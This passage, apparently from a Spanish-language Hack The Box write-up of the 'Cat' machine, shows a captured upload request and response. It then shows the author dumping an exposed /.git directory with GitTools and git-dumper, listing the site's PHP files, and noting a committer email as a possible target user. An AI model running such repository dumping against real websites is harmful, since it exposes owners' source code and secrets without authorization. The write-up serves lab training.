<span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>png<span class="token punctuation">,</span>image<span class="token operator">/</span>svg<span class="token operator">+</span>xml<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------2525655587332479862513910270
Content-Length: 125072
Origin: http://cat.htb
Connection: keep-alive
Referer: http://cat.htb/contest.php
Cookie: PHPSESSID=el281bprg2ti42m6j0htoq4bom
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------2525655587332479862513910270
Content-Disposition: form-data; name="cat_name"

GATO2
-----------------------------2525655587332479862513910270
Content-Disposition: form-data; name="age"

23
-----------------------------2525655587332479862513910270
Content-Disposition: form-data; name="birthdate"

2077-02-02
-----------------------------2525655587332479862513910270
Content-Disposition: form-data; name="weight"

95
-----------------------------2525655587332479862513910270
Content-Disposition: form-data; name="cat_photo"; filename="image(1).png"
Content-Type: image/png

PNG


IHDR7SËöÓ7	pHYsÄÄ+ IDATxìw\GÇ½JïJ·6P{ïÝ{ï-ÄDc7±
...
</span></code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Response:</p></div><div class="el-pre"><pre class="language-java" tabindex="0"><code data-line="0" class="language-java is-loaded"><span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span> <span class="token number">200</span> <span class="token constant">OK</span>
<span class="token class-name">Date</span><span class="token operator">:</span> <span class="token class-name">Thu</span><span class="token punctuation">,</span> <span class="token number">06</span> <span class="token class-name">Feb</span> <span class="token number">2025</span> <span class="token number">11</span><span class="token operator">:</span><span class="token number">09</span><span class="token operator">:</span><span class="token number">45</span> <span class="token constant">GMT</span>
<span class="token class-name">Server</span><span class="token operator">:</span> <span class="token class-name">Apache</span><span class="token operator">/</span><span class="token number">2.4</span><span class="token number">.41</span> <span class="token punctuation">(</span><span class="token class-name">Ubuntu</span><span class="token punctuation">)</span>
<span class="token class-name">Expires</span><span class="token operator">:</span> <span class="token class-name">Thu</span><span class="token punctuation">,</span> <span class="token number">19</span> <span class="token class-name">Nov</span> <span class="token number">1981</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">52</span><span class="token operator">:</span><span class="token number">00</span> <span class="token constant">GMT</span>
<span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> no<span class="token operator">-</span>store<span class="token punctuation">,</span> no<span class="token operator">-</span>cache<span class="token punctuation">,</span> must<span class="token operator">-</span>revalidate
<span class="token class-name">Pragma</span><span class="token operator">:</span> no<span class="token operator">-</span>cache
<span class="token class-name">Vary</span><span class="token operator">:</span> <span class="token class-name">Accept</span><span class="token operator">-</span><span class="token class-name">Encoding</span>
<span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Length</span><span class="token operator">:</span> <span class="token number">2391</span>
<span class="token class-name">Keep</span><span class="token operator">-</span><span class="token class-name">Alive</span><span class="token operator">:</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> max<span class="token operator">=</span><span class="token number">100</span>
<span class="token class-name">Connection</span><span class="token operator">:</span> <span class="token class-name">Keep</span><span class="token operator">-</span><span class="token class-name">Alive</span>
<span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Type</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">;</span> charset<span class="token operator">=</span><span class="token constant">UTF</span><span class="token operator">-</span><span class="token number">8</span>



<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">DOCTYPE</span> html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>html lang<span class="token operator">=</span><span class="token string">"en"</span><span class="token operator">&gt;</span>
<span class="token generics"><span class="token punctuation">&lt;</span>head<span class="token punctuation">&gt;</span></span>
<span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>meta name<span class="token operator">=</span><span class="token string">"viewport"</span> content<span class="token operator">=</span><span class="token string">"width=device-width, initial-scale=1.0"</span><span class="token operator">&gt;</span>
<span class="token generics"><span class="token punctuation">&lt;</span>title<span class="token punctuation">&gt;</span></span><span class="token class-name">Contest</span> <span class="token operator">-</span> <span class="token class-name">Best</span> <span class="token class-name">Cat</span> <span class="token class-name">Community</span><span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>link rel<span class="token operator">=</span><span class="token string">"stylesheet"</span> href<span class="token operator">=</span><span class="token string">"css/styles.css"</span><span class="token operator">&gt;</span>
<span class="token generics"><span class="token punctuation">&lt;</span>style<span class="token punctuation">&gt;</span></span>
    <span class="token punctuation">.</span>container <span class="token punctuation">{</span>
        max<span class="token operator">-</span>width<span class="token operator">:</span> <span class="token number">600</span>px<span class="token punctuation">;</span>
        margin<span class="token operator">:</span> <span class="token number">20</span>px auto<span class="token punctuation">;</span>
        padding<span class="token operator">:</span> <span class="token number">20</span>px<span class="token punctuation">;</span>
        background<span class="token operator">-</span>color<span class="token operator">:</span> #fff<span class="token punctuation">;</span>
        border<span class="token operator">-</span>radius<span class="token operator">:</span> <span class="token number">5</span>px<span class="token punctuation">;</span>
        box<span class="token operator">-</span>shadow<span class="token operator">:</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">10</span>px <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0.1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    form <span class="token punctuation">{</span>
        padding<span class="token operator">:</span> <span class="token number">20</span>px<span class="token punctuation">;</span>
        box<span class="token operator">-</span>sizing<span class="token operator">:</span> border<span class="token operator">-</span>box<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    label<span class="token punctuation">,</span>
    input <span class="token punctuation">{</span>
        display<span class="token operator">:</span> block<span class="token punctuation">;</span>
        margin<span class="token operator">-</span>bottom<span class="token operator">:</span> <span class="token number">10</span>px<span class="token punctuation">;</span>
        width<span class="token operator">:</span> <span class="token number">100</span><span class="token operator">%</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    input<span class="token punctuation">[</span>type<span class="token operator">=</span><span class="token string">"submit"</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>
        background<span class="token operator">-</span>color<span class="token operator">:</span> #<span class="token number">007</span>bff<span class="token punctuation">;</span>
        color<span class="token operator">:</span> #fff<span class="token punctuation">;</span>
        border<span class="token operator">:</span> none<span class="token punctuation">;</span>
        border<span class="token operator">-</span>radius<span class="token operator">:</span> <span class="token number">5</span>px<span class="token punctuation">;</span>
        padding<span class="token operator">:</span> <span class="token number">15</span>px <span class="token number">20</span>px<span class="token punctuation">;</span>
        cursor<span class="token operator">:</span> pointer<span class="token punctuation">;</span>
        transition<span class="token operator">:</span> background<span class="token operator">-</span>color <span class="token number">0.3</span>s<span class="token punctuation">;</span>
        width<span class="token operator">:</span> <span class="token number">100</span><span class="token operator">%</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    input<span class="token punctuation">[</span>type<span class="token operator">=</span><span class="token string">"submit"</span><span class="token punctuation">]</span><span class="token operator">:</span>hover <span class="token punctuation">{</span>
        background<span class="token operator">-</span>color<span class="token operator">:</span> #<span class="token number">0056</span>b3<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token punctuation">.</span>message <span class="token punctuation">{</span>
        margin<span class="token operator">-</span>top<span class="token operator">:</span> <span class="token number">20</span>px<span class="token punctuation">;</span>
        text<span class="token operator">-</span>align<span class="token operator">:</span> center<span class="token punctuation">;</span>
        color<span class="token operator">:</span> green<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token punctuation">.</span>error<span class="token operator">-</span>message <span class="token punctuation">{</span>
        margin<span class="token operator">-</span>top<span class="token operator">:</span> <span class="token number">20</span>px<span class="token punctuation">;</span>
        text<span class="token operator">-</span>align<span class="token operator">:</span> center<span class="token punctuation">;</span>
        color<span class="token operator">:</span> red<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>style<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">&gt;</span>
<span class="token generics"><span class="token punctuation">&lt;</span>body<span class="token punctuation">&gt;</span></span>

    <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"navbar"</span><span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"/"</span><span class="token operator">&gt;</span><span class="token class-name">Home</span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"/vote.php"</span><span class="token operator">&gt;</span><span class="token class-name">Vote</span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"/contest.php"</span><span class="token operator">&gt;</span><span class="token class-name">Contest</span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"/winners.php"</span><span class="token operator">&gt;</span><span class="token class-name">Winners</span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"/logout.php"</span><span class="token operator">&gt;</span><span class="token class-name">Logout</span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>

    <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"container"</span><span class="token operator">&gt;</span>
        <span class="token generics"><span class="token punctuation">&lt;</span>h1<span class="token punctuation">&gt;</span></span><span class="token class-name">Contest</span> <span class="token operator">-</span> <span class="token class-name">Best</span> <span class="token class-name">Cat</span> <span class="token class-name">Community</span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">&gt;</span>
                    <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"message"</span><span class="token operator">&gt;</span><span class="token class-name">Cat</span> has been successfully sent <span class="token keyword">for</span> inspection<span class="token punctuation">.</span>&lt;<span class="token operator">/</span>div<span class="token operator">&gt;</span>
                        <span class="token operator">&lt;</span>form method<span class="token operator">=</span><span class="token string">"post"</span> enctype<span class="token operator">=</span><span class="token string">"multipart/form-data"</span><span class="token operator">&gt;</span>
            <span class="token operator">&lt;</span>label <span class="token keyword">for</span><span class="token operator">=</span><span class="token string">"cat_name"</span><span class="token operator">&gt;</span><span class="token class-name">Cat</span> <span class="token class-name">Name</span><span class="token operator">:</span><span class="token operator">&lt;</span><span class="token operator">/</span>label<span class="token operator">&gt;</span>
            <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"text"</span> id<span class="token operator">=</span><span class="token string">"cat_name"</span> name<span class="token operator">=</span><span class="token string">"cat_name"</span> required<span class="token operator">&gt;</span>
            <span class="token operator">&lt;</span>label <span class="token keyword">for</span><span class="token operator">=</span><span class="token string">"age"</span><span class="token operator">&gt;</span><span class="token class-name">Cat</span> <span class="token class-name">Age</span><span class="token operator">:</span><span class="token operator">&lt;</span><span class="token operator">/</span>label<span class="token operator">&gt;</span>
            <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"number"</span> id<span class="token operator">=</span><span class="token string">"age"</span> name<span class="token operator">=</span><span class="token string">"age"</span> required<span class="token operator">&gt;</span>
            <span class="token operator">&lt;</span>label <span class="token keyword">for</span><span class="token operator">=</span><span class="token string">"birthdate"</span><span class="token operator">&gt;</span><span class="token class-name">Cat</span> <span class="token class-name">Birthdate</span><span class="token operator">:</span><span class="token operator">&lt;</span><span class="token operator">/</span>label<span class="token operator">&gt;</span>
            <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"date"</span> id<span class="token operator">=</span><span class="token string">"birthdate"</span> name<span class="token operator">=</span><span class="token string">"birthdate"</span> required<span class="token operator">&gt;</span>
            <span class="token operator">&lt;</span>label <span class="token keyword">for</span><span class="token operator">=</span><span class="token string">"weight"</span><span class="token operator">&gt;</span><span class="token class-name">Cat</span> <span class="token class-name">Weight</span> <span class="token punctuation">(</span>in kg<span class="token punctuation">)</span><span class="token operator">:</span><span class="token operator">&lt;</span><span class="token operator">/</span>label<span class="token operator">&gt;</span>
            <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"number"</span> id<span class="token operator">=</span><span class="token string">"weight"</span> name<span class="token operator">=</span><span class="token string">"weight"</span> step<span class="token operator">=</span><span class="token string">"0.01"</span> required<span class="token operator">&gt;</span>
            <span class="token operator">&lt;</span>label <span class="token keyword">for</span><span class="token operator">=</span><span class="token string">"cat_photo"</span><span class="token operator">&gt;</span><span class="token class-name">Cat</span> <span class="token class-name">Photo</span><span class="token operator">:</span><span class="token operator">&lt;</span><span class="token operator">/</span>label<span class="token operator">&gt;</span>
            <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"file"</span> id<span class="token operator">=</span><span class="token string">"cat_photo"</span> name<span class="token operator">=</span><span class="token string">"cat_photo"</span> accept<span class="token operator">=</span><span class="token string">"image/*"</span> required<span class="token operator">&gt;</span>
            <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"submit"</span> value<span class="token operator">=</span><span class="token string">"Register Cat"</span><span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>

<span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span>



</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Intento buscar donde se guardan las imagenes subidas al servidor; En /vote.php las 3 imagenes visibles se guardan en los siguientes endpoints:</p></div><div class="el-pre"><pre class="language-python" tabindex="0"><code data-line="0" class="language-python is-loaded">http<span class="token punctuation">:</span><span class="token operator">//</span>cat<span class="token punctuation">.</span>htb<span class="token operator">/</span>img<span class="token operator">/</span>cat3<span class="token punctuation">.</span>webp
http<span class="token punctuation">:</span><span class="token operator">//</span>cat<span class="token punctuation">.</span>htb<span class="token operator">/</span>img<span class="token operator">/</span>cat2<span class="token punctuation">.</span>png
http<span class="token punctuation">:</span><span class="token operator">//</span>cat<span class="token punctuation">.</span>htb<span class="token operator">/</span>img<span class="token operator">/</span>cat1<span class="token punctuation">.</span>jpg
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div></div></div><div class="el-h3 heading-wrapper"><h3 data-heading="/uploads" dir="auto" class="heading" id="/uploads"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>/uploads</h3><div class="heading-children"><div class="el-p"><p dir="auto">He probado mil maneras de acceder a la imagen pero no parece que el servidor este guardando las imagenes con el mismo nombre que se suben o igual no en ese directorio ;  Prosigo haciendo el Recon</p></div></div></div></div></div><div class="el-h2 heading-wrapper"><h2 data-heading="/.git" dir="auto" class="heading" id="/.git"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>/.git</h2><div class="heading-children"><div class="el-p"><p dir="auto">En el escaneo con nmap nos encuentra un repositorio de git<br>
El endpoint da forbidden.<br>
<span alt="Pasted image 20250206115612.png" src="Pasted image 20250206115612.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250206115612.png" src="machines/cat/imgs/pasted-image-20250206115612.png"></span><br>
Vamos a usar la suite de herramientas de <code>GitTools</code> .<br>
<a data-tooltip-position="top" aria-label="https://github.com/internetwache/GitTools.git" rel="noopener nofollow" class="external-link" href="https://github.com/internetwache/GitTools.git" target="_blank">Repositorio</a></p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">➜  Dumper git:<span class="token punctuation">(</span>master<span class="token punctuation">)</span> ./gitdumper.sh http://cat.htb/.git/ GitCatDump
<span class="token comment">###########</span>
<span class="token comment"># GitDumper is part of https://github.com/internetwache/GitTools</span>
<span class="token comment">#</span>
<span class="token comment"># Developed and maintained by @gehaxelt from @internetwache</span>
<span class="token comment">#</span>
<span class="token comment"># Use at your own risk. Usage might be illegal in certain circumstances. </span>
<span class="token comment"># Only for educational purposes!</span>
<span class="token comment">###########</span>


<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Destination folder does not exist
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Creating GitCatDump/.git/
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloaded: HEAD
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Downloaded: objects/info/packs
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloaded: description
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloaded: config
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloaded: COMMIT_EDITMSG
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloaded: index
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Downloaded: packed-refs
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloaded: refs/heads/master
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Downloaded: refs/remotes/origin/HEAD
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Downloaded: refs/stash
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloaded: logs/HEAD
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloaded: logs/refs/heads/master
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Downloaded: logs/refs/remotes/origin/HEAD
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Downloaded: info/refs
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloaded: info/exclude
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Downloaded: /refs/wip/index/refs/heads/master
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Downloaded: /refs/wip/wtree/refs/heads/master
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloaded: objects/8c/2c2701eb4e3c9a42162cfb7b681b6166287fd5
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Downloaded: objects/00/00000000000000000000000000000000000000
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloaded: objects/c9/e281ffb3f5431800332021326ba5e97aeb2764
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloaded: objects/56/03bb235ee634e1d7914def967c26f9dd0963bb
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloaded: objects/64/d98c5af736de120e17eff23b17e22aad668718
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloaded: objects/31/e87489c5f8160f895e941d00087bea94f21315
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloaded: objects/0c/be0133fb00b13165bd7318e42e17f322daac7f
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloaded: objects/6f/ae98c9ae65a9ecbf37e821e7bafb48bcdac2bc
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloaded: objects/91/92afa265e9e73f533227e4f118f882615d3640
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloaded: objects/0f/fa90ae01a4f353aa2f6b2de03c212943412222
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloaded: objects/b8/7b8c6317f8e419dac2c3ce3517a6c93b235028
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloaded: objects/26/bd62c92bcf4415f2b82514bbbac83936c53cb5
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloaded: objects/38/660821153b31dbbee89396eacf974c095ab0dc
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloaded: objects/58/62718ef94b524f3e36627e6f2eae1e3570a7f4
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloaded: objects/b7/df8d295f9356332f9619ae5ecec3230a880ef2
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloaded: objects/88/12266cb97013f416c175f9a9fa08aae524c92a
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloaded: objects/cf/8166a8873d413e6afd88fa03305880e795a2c6
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloaded: objects/9a/dbf70baf0e260d84d9c8666a0460e75e8be4a8
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloaded: objects/48/21d0cd8fecc8c3579be5735b1aab69f1637c86
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloaded: objects/7b/a662bf012ce71d0db9e86c80386b7ae0a54ea1
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloaded: objects/9b/e1a76f22449a7876a712d34dc092f477169c36
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Downloaded: objects/09/7745b30047ab3d3e6e0c5239c2dfd5cac308a5
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Vamos a echar un vistazo a ver si encontramos algo interesante;</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">.git git:<span class="token punctuation">(</span>master<span class="token punctuation">)</span> strings index
DIRC
accept_cat.php
        admin.php
config.php
contest.php
css/styles.css
?S2<span class="token string">'
a]6@
delete_cat.php
img/cat1.jpg
img/cat2.png
img/cat3.webp
img_winners/cat1.jpg
img_winners/cat2.png
img_winners/cat3.webp
;#P(
        index.php
join.php
logout.php
KRO&gt;6b~o.
view_cat.php
vote.php
winners.php
                        wE
&amp;winners/cat_report_20240831_173129.php
TREE
19 4
3 !2k
'</span>dcss
<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token punctuation">)</span>CA<span class="token string">""</span>winners
<span class="token operator">=</span>A<span class="token operator">&gt;</span>j
img_winners
<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token punctuation">)</span>CA<span class="token string">""</span>o
t6+x
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Parece que encontramos algunos endpoints interesantes como <code>delete_cat.php</code> o <code>view_cat.php</code></p></div><div class="el-hr"><hr></div><div class="el-h3 heading-wrapper"><h3 data-heading="view_cat.php" dir="auto" class="heading" id="view_cat.php"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>view_cat.php</h3><div class="heading-children"><div class="el-p"><p dir="auto">Pruebo el endpoint pero me redirige<br>
<span alt="Pasted image 20250206162924.png" src="Pasted image 20250206162924.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250206162924.png" src="machines/cat/imgs/pasted-image-20250206162924.png"></span></p></div></div></div><div class="el-h3 heading-wrapper"><h3 data-heading="delete_cat.php" dir="auto" class="heading" id="delete_cat.php"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>delete_cat.php</h3><div class="heading-children"><div class="el-p"><p dir="auto">Este endpoint me da un 200 pero con el mensaje "access denied" puede sernos de utilidad mas tarde<br>
<span alt="Pasted image 20250206164029.png" src="Pasted image 20250206164029.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250206164029.png" src="machines/cat/imgs/pasted-image-20250206164029.png"></span></p></div><div class="el-hr"><hr></div><div class="el-p"><p dir="auto">El archivo  .git/logs/HEAD es el archivo de un commit </p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">0000000000000000000000000000000000000000 8c2c2701eb4e3c9a42162cfb7b681b6166287fd5 Axel <span class="token operator">&lt;</span>axel2017@gmail.com<span class="token operator">&gt;</span> <span class="token number">1725146774</span> +0000    commit <span class="token punctuation">(</span>initial<span class="token punctuation">)</span>: Cat v1
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Nos guardamos el mail como posible usuario explotable</p></div><div class="el-p"><p dir="auto">Pruebo con git-dumper ya que esta anterior no me exporto todo lo que tenia que exportar; (me lo conto un pajarito)</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded"><span class="token punctuation">(</span>venv<span class="token punctuation">)</span> ➜  DUMP git:<span class="token punctuation">(</span>master<span class="token punctuation">)</span> tree <span class="token builtin class-name">.</span>
<span class="token builtin class-name">.</span>
<span class="token operator">|</span>-- accept_cat.php
<span class="token operator">|</span>-- admin.php
<span class="token operator">|</span>-- config.php
<span class="token operator">|</span>-- contest.php
<span class="token operator">|</span>-- css
<span class="token operator">|</span>   <span class="token variable"><span class="token variable">`</span>-- styles.css
<span class="token operator">|</span>-- delete_cat.php
<span class="token operator">|</span>-- img
<span class="token operator">|</span>   <span class="token operator">|</span>-- cat1.jpg
<span class="token operator">|</span>   <span class="token operator">|</span>-- cat2.png
<span class="token operator">|</span>   <span class="token variable">`</span></span>-- cat3.webp
<span class="token operator">|</span>-- img_winners
<span class="token operator">|</span>   <span class="token operator">|</span>-- cat1.jpg
<span class="token operator">|</span>   <span class="token operator">|</span>-- cat2.png
<span class="token operator">|</span>   <span class="token variable"><span class="token variable">`</span>-- cat3.webp
<span class="token operator">|</span>-- index.php
<span class="token operator">|</span>-- join.php
<span class="token operator">|</span>-- logout.php
<span class="token operator">|</span>-- view_cat.php
<span class="token operator">|</span>-- vote.php
<span class="token operator">|</span>-- winners
<span class="token operator">|</span>   <span class="token variable">`</span></span>-- cat_report_20240831_173129.php
`-- winners.php
